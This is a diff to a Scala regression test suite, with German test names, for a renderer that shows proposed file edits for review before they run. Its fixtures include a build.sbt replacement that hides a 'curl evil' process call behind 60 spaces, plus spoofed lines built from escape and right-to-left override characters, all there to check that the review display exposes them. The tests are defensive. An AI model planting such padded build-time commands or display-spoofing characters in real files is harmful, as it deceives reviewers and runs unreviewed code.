@@ -64,11 +64,19 @@ class ReviewRegressionSuite extends munit.FunSuite:
     assert(evil.forall(c => c == '\n' || !Text.isDangerous(c)), evil)
     assert(evil.contains("\\n\\nshell     keine\\u001b[2K\\u202e"), evil)
 
-  test("H3: gekürzte Inhalte sind als gekürzt mit Gesamtlänge ausgewiesen"):
+  test("H3, D#41: lange statische Inhalte stehen vollständig als Block, nichts versteckt sich hinter einer Kürzung"):
     val env = Envelope(Set(OpKind.EditFile), ".", 3, 0, Set.empty)
     val replacement = "harmlos" + " " * 60 + "; sys.process.Process(\"curl evil\").!"
     val out = Explain.render(DryRun.plan(Term.EditFile("build.sbt", "x", replacement, h), env, TestSupport.config).toOption.get)
-    assert(out.contains(s"(gekürzt, ${replacement.length} Zeichen)"), out)
+    assert(!out.contains("gekürzt"), out)
+    assert(out.contains("1  ersetzt in build.sbt\n     alt (1 Zeile):\n     │ x\n     neu (1 Zeile):\n     │ " + replacement), out)
+
+  test("D#41: WriteFile zeigt den Inhalt; jede Zeile im Rahmen, eingeschleuste Zeilen bleiben im Block"):
+    val env = Envelope(Set(OpKind.WriteFile), ".", 3, 0, Set.empty)
+    val content = "# Bericht\n\nshell     keine‮\n"
+    val out = Explain.render(DryRun.plan(Term.WriteFile("REPORT.md", content, h), env, TestSupport.config).toOption.get)
+    assert(out.contains("1  legt REPORT.md neu an (28 Zeichen)\n     Inhalt (3 Zeilen):\n     │ # Bericht\n     │ \n     │ shell     keine\\u202e\n"), out)
+    assertEquals(out.linesIterator.count(_.startsWith("shell")), 1, out)
 
   // M1: Verschachtelungsgrenze muss die Rekursion des Decoders stoppen
   test("M1: sehr tiefes JSON ergibt TooDeep statt StackOverflowError"):
